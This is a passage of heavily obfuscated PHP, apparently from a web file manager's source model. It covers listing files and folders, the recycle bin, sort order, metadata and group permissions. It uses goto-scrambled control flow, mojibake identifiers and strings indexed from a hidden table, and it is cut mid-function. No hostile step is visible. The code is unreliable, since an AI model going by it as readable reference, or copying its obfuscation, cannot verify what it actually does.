$Fæ¡–î Ì³[$Fç¾ƒã‰„õ][] = $eÌí˜«‹ÄŠ[$FÀŒ…•âˆö[417]]; } $CØõÍ›Ø = array(); goto D·àÁ—ÆÏ÷; bòƒóÙˆ“Ã: if ($D¨Ü‚ê¦—) { Model($FÀŒ…•âˆö[418])->removeBySource($D¨Ü‚ê¦—); } return $Dƒ‘ªÚÓˆ‡; goto c†™ï·œ§‡; e»ìÍµ¦ö: if (!$Dƒ‘ªÚÓˆ‡ || count($CØõÍ›Ø) == $Dƒ‘ªÚÓˆ‡[$FÀŒ…•âˆö[363]][$FÀŒ…•âˆö[364]]) { return $Dƒ‘ªÚÓˆ‡; } $D¨Ü‚ê¦— = array(); $c•Ìèˆ±î = array_to_keyvalue($Dƒ‘ªÚÓˆ‡[$FÀŒ…•âˆö[75]], $FÀŒ…•âˆö[33], $FÀŒ…•âˆö[394]); goto AĞÒîÕèè; D·àÁ—ÆÏ÷: foreach ($Fæ¡–î Ì³ as $e©Š‡è™õ÷ => $BçááĞÑ÷) { $bÍ¿‚ØÏ±® = !0; if (!$a””‘Ò‘Áô) { $CØõÍ›Ø[] = $e©Š‡è™õ÷; continue; } foreach ($a””‘Ò‘Áô as $Dº£å¤£Àå) { if (!in_array($Dº£å¤£Àå, $BçááĞÑ÷)) { $bÍ¿‚ØÏ±® = !1; break; } } if ($bÍ¿‚ØÏ±®) { $CØõÍ›Ø[] = $e©Š‡è™õ÷; } } if (!$CØõÍ›Ø) { return array(); } $Dƒ‘ªÚÓˆ‡ = $this->listSource(array($FÀŒ…•âˆö[408] => array($FÀŒ…•âˆö[409], $CØõÍ›Ø))); goto e»ìÍµ¦ö; AĞÒîÕèè: $a˜¾ÑÑçË = array_to_keyvalue($Dƒ‘ªÚÓˆ‡[$FÀŒ…•âˆö[74]], $FÀŒ…•âˆö[33], $FÀŒ…•âˆö[394]); $bãÊî¨‚œÕ = array_merge($a˜¾ÑÑçË, $c•Ìèˆ±î); foreach ($CØõÍ›Ø as $Fç¾ƒã‰„õ) { if (!in_array($Fç¾ƒã‰„õ, $bãÊî¨‚œÕ)) { $D¨Ü‚ê¦—[] = $Fç¾ƒã‰„õ; } } goto bòƒóÙˆ“Ã; c†™ï·œ§‡: } public function listUserRecycle() { $cµêŸ÷è×— =& $_SERVER[Ç³Íß¦Ó]; $EÃ„‹ŒÕÆ¢ = Model($cµêŸ÷è×—[419])->listData(); if (!$EÃ„‹ŒÕÆ¢) { return array(); } $Cö‚ÅºÛ‹ = array($cµêŸ÷è×—[408] => array($cµêŸ÷è×—[409], $EÃ„‹ŒÕÆ¢), $cµêŸ÷è×—[420] => 1); return $this->listSource($Cö‚ÅºÛ‹); } public function listSource($Cëœƒ² ƒ©, $dÜÑ—¬ïîµ = 3000) { goto eÂ÷¨Á‰¤Å; eÂ÷¨Á‰¤Å: $E‘äÅ¨ÀƒÜ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($Cëœƒ² ƒ©[$E‘äÅ¨ÀƒÜ[421]])) { $Cëœƒ² ƒ©[$E‘äÅ¨ÀƒÜ[421]] = 0; } $e‘Óª·‡ì÷ = $E‘äÅ¨ÀƒÜ[422]; goto b›ÈÇÀ‚İÎ; fê˜ğÇ©£Ê: return $C­“¬ĞÆù´; goto Aö•‘ªš­Ú; b›ÈÇÀ‚İÎ: $C­“¬ĞÆù´ = $this->field($e‘Óª·‡ì÷)->_makeOrder()->where($Cëœƒ² ƒ©)->selectPage($dÜÑ—¬ïîµ); $this->_listDataApply($C­“¬ĞÆù´[$E‘äÅ¨ÀƒÜ[366]]); $this->_listMake($C­“¬ĞÆù´); goto fê˜ğÇ©£Ê; Aö•‘ªš­Ú: } protected function _makeOrder() { goto Bõï¡¶‡Ì; e‰¿ëµ‹âÅ: if ($dÔªò†Œµå == $cÚÇ·³™æ[28]) { } $aŒó¡ğ‡Ö· = $cÚÇ·³™æ[435] . $EÄ³¼‹ÏŒ[$dÔªò†Œµå] . $cÚÇ·³™æ[50] . $fÔ‘ß‘ÆÊ¡[$cÆêöµêˆİ]; return $this->order(rtrim(trim($aŒó¡ğ‡Ö·), $cÚÇ·³™æ[47])); goto Câ©¬æĞ; Bõï¡¶‡Ì: $cÚÇ·³™æ =& $_SERVER[Ç³Íß¦Ó]; $c¾¡„ÉŸÏõ = Model($cÚÇ·³™æ[423])->get($cÚÇ·³™æ[424]); $C¼ªÜË©ç™ = Model($cÚÇ·³™æ[423])->get($cÚÇ·³™æ[425]); goto F²íÇ‘Üï³; b½ôÌ ‚ÔĞ: $cÆêöµêˆİ = Input::get($cÚÇ·³™æ[434], $cÚÇ·³™æ[7], $C¼ªÜË©ç™, array_keys($fÔ‘ß‘ÆÊ¡)); if (!in_array($dÔªò†Œµå, array_keys($EÄ³¼‹ÏŒ))) { $dÔªò†Œµå = $cÚÇ·³™æ[28]; } if (!in_array($cÆêöµêˆİ, array_keys($fÔ‘ß‘ÆÊ¡))) { $dÔªò†Œµå = $cÚÇ·³™æ[426]; } goto e‰¿ëµ‹âÅ; F²íÇ‘Üï³: $fÔ‘ß‘ÆÊ¡ = array($cÚÇ·³™æ[426] => $cÚÇ·³™æ[427], $cÚÇ·³™æ[428] => $cÚÇ·³™æ[429]); $EÄ³¼‹ÏŒ = array($cÚÇ·³™æ[28] => $cÚÇ·³™æ[28], $cÚÇ·³™æ[78] => $cÚÇ·³™æ[78], $cÚÇ·³™æ[168] => $cÚÇ·³™æ[403], $cÚÇ·³™æ[430] => $cÚÇ·³™æ[430], $cÚÇ·³™æ[431] => $cÚÇ·³™æ[432], $cÚÇ·³™æ[193] => $cÚÇ·³™æ[193], $cÚÇ·³™æ[84] => $cÚÇ·³™æ[84]); $dÔªò†Œµå = Input::get($cÚÇ·³™æ[433], $cÚÇ·³™æ[7], $c¾¡„ÉŸÏõ, array_keys($EÄ³¼‹ÏŒ)); goto b½ôÌ ‚ÔĞ; Câ©¬æĞ: } protected function _listDataApplyItem($fÉãÇÕ›Ì…, $C…Ë‹˜  = false) { $fğ×¬ƒŒ®ù = array($fÉãÇÕ›Ì…); $this->_listDataApply($fğ×¬ƒŒ®ù, $C…Ë‹˜ ); return $fğ×¬ƒŒ®ù[0]; } protected function _listDataApply(&$Fó­‰•ğî“, $b´‰¨Á„¦ = false) { goto aóøƒñ¸à¹; c“ø³Éç‚¦: $this->_listAppendUser($Fó­‰•ğî“); $this->_listFilterInfo($Fó­‰•ğî“, $b´‰¨Á„¦); goto b•Ï½Ì¼¶; BØ‚ŒêÏ¡Û: $this->_listAppendPath($Fó­‰•ğî“); $this->_listAppendAuth($Fó­‰•ğî“); $this->_listAppendSourceInfo($Fó­‰•ğî“, $bÂ£ã‡ÀŒ); goto c“ø³Éç‚¦; aóøƒñ¸à¹: $FîÈíÓ®’ =& $_SERVER[Ç³Íß¦Ó]; if (!$Fó­‰•ğî“) { $Fó­‰•ğî“ = array(); return; } $bÂ£ã‡ÀŒ = array_to_keyvalue($Fó­‰•ğî“, $FîÈíÓ®’[33], $FîÈíÓ®’[394]); goto D÷©·ñŸ†; D÷©·ñŸ†: $bÂ£ã‡ÀŒ = array_unique($bÂ£ã‡ÀŒ); $this->_listSourceCache($Fó­‰•ğî“); if (!$b´‰¨Á„¦) { $this->_listAppendMeta($Fó­‰•ğî“, $bÂ£ã‡ÀŒ); $this->_listAppendFileMeta($Fó­‰•ğî“, $bÂ£ã‡ÀŒ); $this->_listAppendChildren($Fó­‰•ğî“, $bÂ£ã‡ÀŒ); } goto BØ‚ŒêÏ¡Û; b•Ï½Ì¼¶: } protected function _listSourceCache($E²‡äÒÉäˆ) { $bğ³ÇÉéÅ =& $_SERVER[Ç³Íß¦Ó]; foreach ($E²‡äÒÉäˆ as $F¼‘ÁÉÕ‹’) { self::$cacheSourceInfo[$bğ³ÇÉéÅ[436] . $F¼‘ÁÉÕ‹’[$bğ³ÇÉéÅ[394]]] = $F¼‘ÁÉÕ‹’; } } protected function _listFilterInfo(&$A…›Õ×Ñ, $D½¥¼ªãá‰ = false) { $c‹ÆŒ««¡ =& $_SERVER[Ç³Íß¦Ó]; foreach ($A…›Õ×Ñ as &$fÃ¡ÆßéºÜ) { $fÃ¡ÆßéºÜ = $this->pathInfoFilter($fÃ¡ÆßéºÜ); self::$cachePathInfo[$c‹ÆŒ««¡[437] . intval($D½¥¼ªãá‰) . $c‹ÆŒ««¡[438] . $fÃ¡ÆßéºÜ[$c‹ÆŒ««¡[394]]] = $fÃ¡ÆßéºÜ; } unset($fÃ¡ÆßéºÜ); } protected function _listMake(&$c—°ìç½ÀÊ) { $eİ¢‹²¥ã =& $_SERVER[Ç³Íß¦Ó]; $c—°ìç½ÀÊ[$eİ¢‹²¥ã[75]] = array(); $c—°ìç½ÀÊ[$eİ¢‹²¥ã[74]] = array(); foreach ($c—°ìç½ÀÊ[$eİ¢‹²¥ã[366]] as $EáŠ÷¬ÁÁ) { $B ƒ•¤­á® = $EáŠ÷¬ÁÁ[$eİ¢‹²¥ã[401]] == 1 ? $eİ¢‹²¥ã[75] : $eİ¢‹²¥ã[74]; $c—°ìç½ÀÊ[$B ƒ•¤­á®][] = $EáŠ÷¬ÁÁ; } unset($c—°ìç½ÀÊ[$eİ¢‹²¥ã[366]]); } protected function _listAppendMeta(&$C†¢òç¬³÷, $bâÁÄˆ˜ôš) { goto AÇ¹Áƒïš; c“¼ø‘¶’‚: if (!$Bà·ëÈˆµ£) { return; } $b¢õê¯»¾ = array($C±«ÜšÅÊÙ[441], $C±«ÜšÅÊÙ[442]); $dÕÉ™‚¹Çİ = array(); goto d„Ë¸æÁº; AÇ¹Áƒïš: $C±«ÜšÅÊÙ =& $_SERVER[Ç³Íß¦Ó]; $a®ë¢¨® = array($C±«ÜšÅÊÙ[408] => array($C±«ÜšÅÊÙ[409], $bâÁÄˆ˜ôš)); $Bà·ëÈˆµ£ = Model($C±«ÜšÅÊÙ[439])->field($C±«ÜšÅÊÙ[440])->where($a®ë¢¨®)->select(); goto c“¼ø‘¶’‚; d„Ë¸æÁº: foreach ($Bà·ëÈˆµ£ as $d÷¬ƒì›¦š) { if (!isset($dÕÉ™‚¹Çİ[$d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[394]]])) { $dÕÉ™‚¹Çİ[$d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[394]]] = array(); } if (in_array($d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[93]], $b¢õê¯»¾)) { continue; } $dÕÉ™‚¹Çİ[$d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[394]]][$d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[93]]] = $d÷¬ƒì›¦š[$C±«ÜšÅÊÙ[371]]; } foreach ($C†¢òç¬³÷ as &$a‰º‹ò÷‚) { $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[443]] = !1; if (isset($dÕÉ™‚¹Çİ[$a‰º‹ò÷‚[$C±«ÜšÅÊÙ[394]]])) { $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[443]] = $dÕÉ™‚¹Çİ[$a‰º‹ò÷‚[$C±«ÜšÅÊÙ[394]]]; } if ($this->fileIsLock($a‰º‹ò÷‚) && $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[404]]) { $e¤î·èôùè = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[404]][$C±«ÜšÅÊÙ[405]] = AuthModel::authDisable($a‰º‹ò÷‚[$C±«ÜšÅÊÙ[404]][$C±«ÜšÅÊÙ[405]], $e¤î·èôùè); $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[404]][$C±«ÜšÅÊÙ[444]][$C±«ÜšÅÊÙ[404]] = $a‰º‹ò÷‚[$C±«ÜšÅÊÙ[404]][$C±«ÜšÅÊÙ[405]]; } } unset($a‰º‹ò÷‚); goto Aù´„Îª³°; Aù´„Îª³°: } protected function _listAppendFileMeta(&$EÃæİ õá, $c…Æ‚‡Â©À) { goto B‹ƒÊåá¡; F‰çÒ ÇÂ: $eÒİšİ¬ËŞ = $eÒİšİ¬ËŞ ? $eÒİšİ¬ËŞ : array(); $fØÎ‡®«øƒ = array(); foreach ($eÒİšİ¬ËŞ as $D•œè‚‹Í) { if (!isset($fØÎ‡®«øƒ[$D•œè‚‹Í[$A´ŸØ×İÉ©[445]]])) { $fØÎ‡®«øƒ[$D•œè‚‹Í[$A´ŸØ×İÉ©[445]]] = array(); } $fØÎ‡®«øƒ[$D•œè‚‹Í[$A´ŸØ×İÉ©[445]]][$D•œè‚‹Í[$A´ŸØ×İÉ©[93]]] = $D•œè‚‹Í[$A´ŸØ×İÉ©[371]]; } goto fòÃÂ”È…Š; B®òÙš£Ê´: $e…Ú‹ÁÜåß = Model($A´ŸØ×İÉ©[448])->field($DÓ¬×´Œ‰Ö)->where($AôË‘å‚×)->select(); $e…Ú‹ÁÜåß = array_to_keyvalue($e…Ú‹ÁÜåß, $A´ŸØ×İÉ©[445]); $eÒİšİ¬ËŞ = Model($A´ŸØ×İÉ©[449])->field($A´ŸØ×İÉ©[450])->where($AôË‘å‚×)->select(); goto F‰çÒ ÇÂ; B‹ƒÊåá¡: $A´ŸØ×İÉ© =& $_SERVER[Ç³Íß¦Ó]; $dÔ·¯‚‘ğí = array_to_keyvalue($EÃæİ õá, $A´ŸØ×İÉ©[33], $A´ŸØ×İÉ©[445]); $dÔ·¯‚‘ğí = array_filter(array_unique($dÔ·¯‚‘ğí)); goto AñŞâ¨Õ¢“; AñŞâ¨Õ¢“: if (!$dÔ·¯‚‘ğí) { return; } $AôË‘å‚× = array($A´ŸØ×İÉ©[446] => array($A´ŸØ×İÉ©[409], $dÔ·¯‚‘ğí)); $DÓ¬×´Œ‰Ö = $A´ŸØ×İÉ©[447]; goto B®òÙš£Ê´; fòÃÂ”È…Š: foreach ($EÃæİ õá as &$b®•È›ŸÀæ) { goto D†Ô’„«“ê; aà¾˜æÕ¡: if (isset($b®•È›ŸÀæ[$A´ŸØ×İÉ©[164]][$A´ŸØ×İÉ©[163]])) { $b®•È›ŸÀæ[$A´ŸØ×İÉ©[163]] = json_decode($b®•È›ŸÀæ[$A´ŸØ×İÉ©[164]][$A´ŸØ×İÉ©[163]], !0); unset($b®•È›ŸÀæ[$A´ŸØ×İÉ©[164]][$A´ŸØ×İÉ©[163]]); } goto D¬¿Æ¿£œ÷; D†Ô’„«“ê: $aÊ†ĞÑ‘å´ = $b®•È›ŸÀæ[$A´ŸØ×İÉ©[445]]; if (!$aÊ†ĞÑ‘å´ || !is_array($e…Ú‹ÁÜåß[$aÊ†ĞÑ‘å´])) { continue; } $b â¯Şç‚ = $e…Ú‹ÁÜåß[$aÊ†ĞÑ‘å´]; goto D‡ËÀÙŠÅ; dÜô”¿‡î›: unset($e…Ú‹ÁÜåß[$aÊ†ĞÑ‘å´][$A´ŸØ×İÉ©[76]]); $BêÅÇ×†Ñ§ = is_array($fØÎ‡®«øƒ[$aÊ†ĞÑ‘å´]) ? $fØÎ‡®«øƒ[$aÊ†ĞÑ‘å´] : array(); $b®•È›ŸÀæ[$A´ŸØ×İÉ©[164]] = array_merge($BêÅÇ×†Ñ§, $e…Ú‹ÁÜåß[$aÊ†ĞÑ‘å´]); goto aà¾˜æÕ¡; D‡ËÀÙŠÅ: $b â¯Şç‚[$A´ŸØ×İÉ©[78]] = $b®•È›ŸÀæ[$A´ŸØ×İÉ©[78]]; $b â¯Şç‚[$A´ŸØ×İÉ©[28]] = $b®•È›ŸÀæ[$A´ŸØ×İÉ©[28]]; if (!isset(self::$cacheFileInfo[$A´ŸØ×İÉ©[451] . $aÊ†ĞÑ‘å´])) { self::$cacheFileInfo[$A´ŸØ×İÉ©[451] . $aÊ†ĞÑ‘å´] = array_merge(array(), $b â¯Şç‚); } goto dÜô”¿‡î›; D¬¿Æ¿£œ÷: } unset($b®•È›ŸÀæ); goto E´È§ï¬Ëù; E´È§ï¬Ëù: } protected function _listAppendSourceInfo(&$aÀëªÇµÊŞ, $Aš‚§’Ğ“î) { goto d¹Ÿ×²’; F÷Ú†“•: $aˆÔ—ò´ÄÂ = array_to_keyvalue($DŠáÕç‰¤», $FìéÌ¡ùŠ–[392]); $C¹Ğœí™Òå = array_to_keyvalue_group($d¨¹ŠÚá«Ì, $FìéÌ¡ùŠ–[76], $FìéÌ¡ùŠ–[417]); $fµ™â”¹­ß = array_to_keyvalue($A ø± â•, $FìéÌ¡ùŠ–[76]); goto EŠöØŠâÏæ; d¹Ÿ×²’: $FìéÌ¡ùŠ– =& $_SERVER[Ç³Íß¦Ó]; if (!defined($FìéÌ¡ùŠ–[452])) { return; } $DŠáÕç‰¤» = Model($FìéÌ¡ùŠ–[453])->listData(); goto B‘¿»®äÀœ; EŠöØŠâÏæ: $E´ ‰å– = array_to_keyvalue_group($CÊ»×äÔº´, $FìéÌ¡ùŠ–[394]); foreach ($aÀëªÇµÊŞ as &$a¸Ç„Í—®) { $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]] = array($FìéÌ¡ùŠ–[455] => 0, $FìéÌ¡ùŠ–[456] => 0, $FìéÌ¡ùŠ–[457] => 0); if (isset($fµ™â”¹­ß[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]])) { $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[458]] = 1; $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[459]] = $fµ™â”¹­ß[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]][$FìéÌ¡ùŠ–[28]]; } if (isset($C¹Ğœí™Òå[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]])) { $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[460]] = array(); foreach ($C¹Ğœí™Òå[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]] as $BºÎÓí¬†) { $fËêòœ˜Šš = $aˆÔ—ò´ÄÂ[$BºÎÓí¬†]; $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[460]][] = array($FìéÌ¡ùŠ–[461] => $fËêòœ˜Šš[$FìéÌ¡ùŠ–[392]], $FìéÌ¡ùŠ–[411] => $fËêòœ˜Šš[$FìéÌ¡ùŠ–[28]], $FìéÌ¡ùŠ–[462] => $fËêòœ˜Šš[$FìéÌ¡ùŠ–[463]]); } } if (isset($E´ ‰å–[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]])) { $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[464]] = array(); foreach ($E´ ‰å–[$a¸Ç„Í—®[$FìéÌ¡ùŠ–[394]]] as $E¶ØÌ¯ ´) { $a¸Ç„Í—®[$FìéÌ¡ùŠ–[85]][$FìéÌ¡ùŠ–[464]] = array($FìéÌ¡ùŠ–[465] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[466]], $FìéÌ¡ùŠ–[467] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[468]], $FìéÌ¡ùŠ–[469] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[394]], $FìéÌ¡ùŠ–[470] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[471]], $FìéÌ¡ùŠ–[472] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[473]], $FìéÌ¡ùŠ–[474] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[474]], $FìéÌ¡ùŠ–[475] => $E¶ØÌ¯ ´[$FìéÌ¡ùŠ–[475]]); } } } unset($a¸Ç„Í—®); goto fê×³öÌŸ; B‘¿»®äÀœ: $d¨¹ŠÚá«Ì = Model($FìéÌ¡ùŠ–[416])->listData(); $A ø± â• = Model($FìéÌ¡ùŠ–[406])->listData(); $CÊ»×äÔº´ = Model($FìéÌ¡ùŠ–[454])->listSimple(); goto F÷Ú†“•; fê×³öÌŸ: return $aÀëªÇµÊŞ; goto D¾æ®ˆİÜ‰; D¾æ®ˆİÜ‰: } protected function _listAppendChildren(&$e›‚ä› ÊŠ, $aœ§ŠËÛ¦Ş) { goto Dó¼Î…Áˆ; Dó¼Î…Áˆ: $b‡áäŞ†Â =& $_SERVER[Ç³Íß¦Ó]; $fÔ‡ĞÁ´°Š = array(); $cëÛÚÂˆ˜Î = array($b‡áäŞ†Â[202] => 0, $b‡áäŞ†Â[203] => 0); goto BËÜš°§’ª; AÙÖ²—ìœò: $A§Ó°´·¨ß = array($b‡áäŞ†Â[476] => array($b‡áäŞ†Â[7], $fÔ‡ĞÁ´°Š)); $A»â«ê•Ûï = array($b‡áäŞ†Â[476], $b‡áäŞ†Â[401], $b‡áäŞ†Â[477] => $b‡áäŞ†Â[478]); $eµâ†çíŞÌ = $this->field($A»â«ê•Ûï)->where($A§Ó°´·¨ß)->group($b‡áäŞ†Â[479])->select(); goto càˆì·»Ù; BËÜš°§’ª: foreach ($e›‚ä› ÊŠ as &$E¿ÎÄˆê) { if (!$E¿ÎÄˆê[$b‡áäŞ†Â[401]]) { continue; } $fÔ‡ĞÁ´°Š[] = $E¿ÎÄˆê[$b‡áäŞ†Â[394]]; } unset($E¿ÎÄˆê); if (!$fÔ‡ĞÁ´°Š) { return; } goto AÙÖ²—ìœò; càˆì·»Ù: $E¶ä“å‘·Ó = array(); foreach ($eµâ†çíŞÌ as $cØÚÁ¯¢¯) { $fš‚Üª¡Ò¯ = $cØÚÁ¯¢¯[$b‡áäŞ†Â[476]]; $F“ŞÎÊÉ÷æ = $cØÚÁ¯¢¯[$b‡áäŞ†Â[401]] == $b‡áäŞ†Â[87] ? $b‡áäŞ†Â[203] : $b‡áäŞ†Â[202]; if (!isset($E¶ä“å‘·Ó[$fš‚Üª¡Ò¯])) { $E¶ä“å‘·Ó[$fš‚Üª¡Ò¯] = array($b‡áäŞ†Â[202] => 0, $b‡áäŞ†Â[203] => 0); } $E¶ä“å‘·Ó[$fš‚Üª¡Ò¯][$F“ŞÎÊÉ÷æ] += $cØÚÁ¯¢¯[$b‡áäŞ†Â[478]]; } foreach ($e›‚ä› ÊŠ as &$E¿ÎÄˆê) { if (!$E¿ÎÄˆê[$b‡áäŞ†Â[401]]) { continue; } $a»²í°õ†á = is_array($E¶ä“å‘·Ó[$E¿ÎÄˆê[$b‡áäŞ†Â[394]]]) ? $E¶ä“å‘·Ó[$E¿ÎÄˆê[$b‡áäŞ†Â[394]]] : $cëÛÚÂˆ˜Î; $E¿ÎÄˆê[$b‡áäŞ†Â[203]] = $a»²í°õ†á[$b‡áäŞ†Â[203]]; $E¿ÎÄˆê[$b‡áäŞ†Â[202]] = $a»²í°õ†á[$b‡áäŞ†Â[202]]; unset($E¿ÎÄˆê[$b‡áäŞ†Â[403]]); } goto bŸŠ °Å…; bŸŠ °Å…: unset($E¿ÎÄˆê); goto f‹ì˜µ¹Ê¼; f‹ì˜µ¹Ê¼: } protected function _listAppendAuth(&$D¶Õ†…¶ à) { goto añÊ—‡äÊ; e•ôçÁ· : foreach ($D¶Õ†…¶ à as $EàºŞâñš) { if ($EàºŞâñš[$d„¿ªù‹´ø[402]] == self::TYPE_GROUP) { $AÛÂàŒÍø¯[] = $EàºŞâñš[$d„¿ªù‹´ø[394]]; } } if (!$AÛÂàŒÍø¯) { return; } $eÚŸìÍ²å = array_to_keyvalue($D¶Õ†…¶ à, $d„¿ªù‹´ø[394]); goto eÍ‘½ÁÛÀĞ; eÍ‘½ÁÛÀĞ: $Fâà¦¢øÎ = Model($d„¿ªù‹´ø[480])->getSourceList($AÛÂàŒÍø¯, $eÚŸìÍ²å); foreach ($D¶Õ†…¶ à as $BÇ¸¼íšĞğ => &$EàºŞâñš) { $EàºŞâñš[$d„¿ªù‹´ø[404]] = $Fâà¦¢øÎ[$EàºŞâñš[$d„¿ªù‹´ø[394]]]; if (!$EàºŞâñš[$d„¿ªù‹´ø[404]] && $EàºŞâñš[$d„¿ªù‹´ø[402]] == self::TYPE_GROUP) { $EàºŞâñš[$d„¿ªù‹´ø[404]] = Action($d„¿ªù‹´ø[481])->pathGroupAuthMake($EàºŞâñš[$d„¿ªù‹´ø[482]]); if (!$EàºŞâñš[$d„¿ªù‹´ø[404]] && !_get($GLOBALS, $d„¿ªù‹´ø[483])) { $EàºŞâñš[$d„¿ªù‹´ø[195]] = !1; $EàºŞâñš[$d„¿ªù‹´ø[194]] = !1; } } if ($EàºŞâñš[$d„¿ªù‹´ø[404]]) { $EàºŞâñš[$d„¿ªù‹´ø[195]] = AuthModel::authCheckEdit($EàºŞâñš[$d„¿ªù‹´ø[404]][$d„¿ªù‹´ø[405]]); $EàºŞâñš[$d„¿ªù‹´ø[194]] = AuthModel::authCheckView($EàºŞâñš[$d„¿ªù‹´ø[404]][$d„¿ªù‹´ø[405]]); } $this->groupPathDisplay($EàºŞâñš); } unset($EàºŞâñš); goto c•¨ï¾íÖ; añÊ—‡äÊ: $d„¿ªù‹´ø =& $_SERVER[Ç³Íß¦Ó]; if (!defined($d„¿ªù‹´ø[452])) { return; } $AÛÂàŒÍø¯ = array(); goto e•ôçÁ· ; c•¨ï¾íÖ: } public function groupPathDisplay(&$B°‰õÅ­ó) { goto Fê²¨ˆ®‡; aÇîĞî«ê: $B°‰õÅ­ó[$a™‘”—³˜¡[486]] = $B¨Ó‘„İÌ[$a™‘”—³˜¡[476]]; $B°‰õÅ­ó[$a™‘”—³˜¡[487]] = $B¨Ó‘„İÌ[$a™‘”—³˜¡[485]]; $B°‰õÅ­ó[$a™‘”—³˜¡[488]] = $B¨Ó‘„İÌ[$a™‘”—³˜¡[489]]; goto C’Ê»áóçî; b”ë…Îë¦: $d²ÑŸ‹… = $this->parentLevelArray($B¨Ó‘„İÌ[$a™‘”—³˜¡[485]]); $A–ÔäÉà³Ô = $a™‘”—³˜¡[33]; foreach ($d²ÑŸ‹… as $b¸ÅÙ‘¯×) { $aé‰Ô¶«ö˜ = Model($a™‘”—³˜¡[484])->getInfo($b¸ÅÙ‘¯×); $A–ÔäÉà³Ô .= $aé‰Ô¶«ö˜[$a™‘”—³˜¡[85]][$a™‘”—³˜¡[394]] . $a™‘”—³˜¡[47]; } goto aÇîĞî«ê; C’Ê»áóçî: $B°‰õÅ­ó[$a™‘”—³˜¡[490]] = $A–ÔäÉà³Ô . $B¨Ó‘„İÌ[$a™‘”—³˜¡[85]][$a™‘”—³˜¡[394]]; goto AÄ‘¸„¿ˆñ; Fê²¨ˆ®‡: $a™‘”—³˜¡ =& $_SERVER[Ç³Íß¦Ó]; if ($B°‰õÅ­ó[$a™‘”—³˜¡[402]] != self::TYPE_GROUP) { return; } $B¨Ó‘„İÌ = Model($a™‘”—³˜¡[484])->getInfo($B°‰õÅ­ó[$a™‘”—³˜¡[482]]); goto b”ë…Îë¦; AÄ‘¸„¿ˆñ: } protected function _listAppendPath(&$dÙïÇçºôˆ) { goto E©µÓÄñø—; BçˆìÔ‡¶Ù: $c ¸õêÃñœ = array_unique($c ¸õêÃñœ); if (count($c ¸õêÃñœ) > 0) { $fËÖ¶šÛºÃ = array($eàŸ¶óÑ´[408] => array($eàŸ¶óÑ´[409], $c ¸õêÃñœ)); if (count($c ¸õêÃñœ) == 1) { $E–¤¯„Ñæ = $this->sourceInfo($c ¸õêÃñœ[0]); $bÄ´ÒÉ‚‚ = is_array($E–¤¯„Ñæ) ? array($E–¤¯„Ñæ) : !1; } else { $bÄ´ÒÉ‚‚ = $this->field($eàŸ¶óÑ´[491])->where($fËÖ¶šÛºÃ)->select(); } if (!$bÄ´ÒÉ‚‚) { $bÄ´ÒÉ‚‚ = array(); } foreach ($bÄ´ÒÉ‚‚ as $Eçì†‰«íß) { $fîÈğŞë£[$Eçì†‰«íß[$eàŸ¶óÑ´[394]]] = $Eçì†‰«íß[$eàŸ¶óÑ´[28]]; } } $F¿³ô†ÓËÚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto EòÃ•Ï£¬º; E©µÓÄñø—: $eàŸ¶óÑ´ =& $_SERVER[Ç³Íß¦Ó]; static $fîÈğŞë£ = array(); $c ¸õêÃñœ = array(); goto EéÏˆìóâŒ; EòÃ•Ï£¬º: $fË–¼ä¦  = array(); $eÆ¯ÚçÉß· = array(); foreach ($dÙïÇçºôˆ as &$FØ¯§ñ«Î†) { goto dÅ•ÇÏ´Œ; dÅ•ÇÏ´Œ: $b»ò£ß¡‚© = $FØ¯§ñ«Î†[$eàŸ¶óÑ´[485]]; if (isset($eÆ¯ÚçÉß·[$b»ò£ß¡‚©])) { $AÊÂ¼÷Ô£î = $fË–¼ä¦ [$b»ò£ß¡‚©]; } else { $CÍ»ÍÜìÄÏ = $this->parentLevelArray($FØ¯§ñ«Î†[$eàŸ¶óÑ´[485]]); $b°ìµœÑ°Ê = $eàŸ¶óÑ´[492] . $FØ¯§ñ«Î†[$eàŸ¶óÑ´[402]] . $eàŸ¶óÑ´[438] . $FØ¯§ñ«Î†[$eàŸ¶óÑ´[482]]; if ($fË–¼ä¦ [$b°ìµœÑ°Ê]) { $AÊÂ¼÷Ô£î = $fË–¼ä¦ [$b°ìµœÑ°Ê]; } else { $AÊÂ¼÷Ô£î = $this->_listAppendPathRoot($FØ¯§ñ«Î†, $CÍ»ÍÜìÄÏ); $fË–¼ä¦ [$b°ìµœÑ°Ê] = $AÊÂ¼÷Ô£î; } foreach ($CÍ»ÍÜìÄÏ as $dîèõ‡„¥½ => $B¶íÆ¸º‚) { if ($dîèõ‡„¥½ == 0 && $AÊÂ¼÷Ô£î && $FØ¯§ñ«Î†[$eàŸ¶óÑ´[402]] == self::TYPE_GROUP) { continue; } if (isset($fîÈğŞë£[$B¶íÆ¸º‚])) { 